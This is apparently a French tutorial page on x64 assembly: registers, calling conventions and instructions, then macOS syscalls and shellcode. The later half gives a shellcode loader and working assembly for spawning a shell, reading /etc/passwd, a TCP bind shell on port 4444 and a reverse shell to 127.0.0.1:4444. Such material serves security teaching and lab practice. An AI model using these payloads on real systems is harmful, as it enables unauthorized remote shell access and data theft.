# Introduction à x64

{{#include ../../../banners/hacktricks-training.md}}

## **Introduction à x64**

x64, également connu sous le nom de x86-64, est une architecture de processeur 64 bits principalement utilisée dans l'informatique de bureau et de serveur. Originaire de l'architecture x86 produite par Intel et plus tard adoptée par AMD sous le nom d'AMD64, c'est l'architecture prédominante dans les ordinateurs personnels et les serveurs aujourd'hui.

### **Registres**

x64 s'appuie sur l'architecture x86, avec **16 registres à usage général** étiquetés `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi`, et `r8` à `r15`. Chacun d'eux peut stocker une valeur **64 bits** (8 octets). Ces registres ont également des sous-registres de 32 bits, 16 bits et 8 bits pour la compatibilité et des tâches spécifiques.

1. **`rax`** - Utilisé traditionnellement pour les **valeurs de retour** des fonctions.
2. **`rbx`** - Souvent utilisé comme un **registre de base** pour les opérations mémoire.
3. **`rcx`** - Couramment utilisé pour les **compteurs de boucle**.
4. **`rdx`** - Utilisé dans divers rôles, y compris les opérations arithmétiques étendues.
5. **`rbp`** - **Pointeur de base** pour le cadre de pile.
6. **`rsp`** - **Pointeur de pile**, gardant une trace du sommet de la pile.
7. **`rsi`** et **`rdi`** - Utilisés pour les index **source** et **destination** dans les opérations de chaîne/mémoire.
8. **`r8`** à **`r15`** - Registres supplémentaires à usage général introduits dans x64.

### **Convention d'appel**

La convention d'appel x64 varie selon les systèmes d'exploitation. Par exemple :

- **Windows** : Les **quatre premiers paramètres** sont passés dans les registres **`rcx`**, **`rdx`**, **`r8`**, et **`r9`**. Les paramètres supplémentaires sont poussés sur la pile. La valeur de retour est dans **`rax`**.
- **System V (couramment utilisé dans les systèmes de type UNIX)** : Les **six premiers paramètres entiers ou pointeurs** sont passés dans les registres **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`**, et **`r9`**. La valeur de retour est également dans **`rax`**.

Si la fonction a plus de six entrées, le **reste sera passé sur la pile**. **RSP**, le pointeur de pile, doit être **aligné sur 16 octets**, ce qui signifie que l'adresse à laquelle il pointe doit être divisible par 16 avant qu'un appel ne se produise. Cela signifie que normalement, nous devrions nous assurer que RSP est correctement aligné dans notre shellcode avant de faire un appel de fonction. Cependant, en pratique, les appels système fonctionnent souvent même si cette exigence n'est pas respectée.

### Convention d'appel en Swift

Swift a sa propre **convention d'appel** qui peut être trouvée dans [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)

### **Instructions courantes**

Les instructions x64 ont un ensemble riche, maintenant la compatibilité avec les anciennes instructions x86 et en introduisant de nouvelles.

- **`mov`** : **Déplacer** une valeur d'un **registre** ou d'une **emplacement mémoire** à un autre.
- Exemple : `mov rax, rbx` — Déplace la valeur de `rbx` vers `rax`.
- **`push`** et **`pop`** : Pousser ou retirer des valeurs vers/depuis la **pile**.
- Exemple : `push rax` — Pousse la valeur dans `rax` sur la pile.
- Exemple : `pop rax` — Retire la valeur du sommet de la pile dans `rax`.
- **`add`** et **`sub`** : Opérations d'**addition** et de **soustraction**.
- Exemple : `add rax, rcx` — Ajoute les valeurs dans `rax` et `rcx` en stockant le résultat dans `rax`.
- **`mul`** et **`div`** : Opérations de **multiplication** et de **division**. Remarque : celles-ci ont des comportements spécifiques concernant l'utilisation des opérandes.
- **`call`** et **`ret`** : Utilisés pour **appeler** et **retourner des fonctions**.
- **`int`** : Utilisé pour déclencher une **interruption** logicielle. Par exemple, `int 0x80` était utilisé pour les appels système dans Linux x86 32 bits.
- **`cmp`** : **Comparer** deux valeurs et définir les indicateurs du CPU en fonction du résultat.
- Exemple : `cmp rax, rdx` — Compare `rax` à `rdx`.
- **`je`, `jne`, `jl`, `jge`, ...** : Instructions de **saut conditionnel** qui changent le flux de contrôle en fonction des résultats d'un `cmp` ou d'un test précédent.
- Exemple : Après une instruction `cmp rax, rdx`, `je label` — Saute à `label` si `rax` est égal à `rdx`.
- **`syscall`** : Utilisé pour les **appels système** dans certains systèmes x64 (comme les Unix modernes).
- **`sysenter`** : Une instruction d'**appel système** optimisée sur certaines plateformes.

### **Prologue de fonction**

1. **Pousser l'ancien pointeur de base** : `push rbp` (sauvegarde le pointeur de base de l'appelant)
2. **Déplacer le pointeur de pile actuel vers le pointeur de base** : `mov rbp, rsp` (met en place le nouveau pointeur de base pour la fonction actuelle)
3. **Allouer de l'espace sur la pile pour les variables locales** : `sub rsp, <size>` (où `<size>` est le nombre d'octets nécessaires)

### **Épilogue de fonction**

1. **Déplacer le pointeur de base actuel vers le pointeur de pile** : `mov rsp, rbp` (désalloue les variables locales)
2. **Retirer l'ancien pointeur de base de la pile** : `pop rbp` (restaure le pointeur de base de l'appelant)
3. **Retourner** : `ret` (retourne le contrôle à l'appelant)

## macOS

### syscalls

Il existe différentes classes de syscalls, vous pouvez [**les trouver ici**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
Ensuite, vous pouvez trouver chaque numéro de syscall [**à cette URL**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
Pour appeler l'appel système `open` (**5**) de la **classe Unix/BSD**, vous devez l'ajouter : `0x2000000`

Ainsi, le numéro d'appel système pour appeler open serait `0x2000005`

### Shellcodes

Pour compiler :
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
Pour extraire les octets :
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
<details>

<summary>Code C pour tester le shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Pris de [**ici**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) et expliqué.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}

{{#tab name="avec la pile"}}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}
{{#endtabs}}

#### Lire avec cat

L'objectif est d'exécuter `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, donc le deuxième argument (x1) est un tableau de paramètres (ce qui signifie en mémoire une pile des adresses).
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### Invoker la commande avec sh
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Bind shell

Bind shell de [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) sur **le port 4444**
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### Reverse Shell

Reverse shell de [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Reverse shell vers **127.0.0.1:4444**
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
{{#include ../../../banners/hacktricks-training.md}}
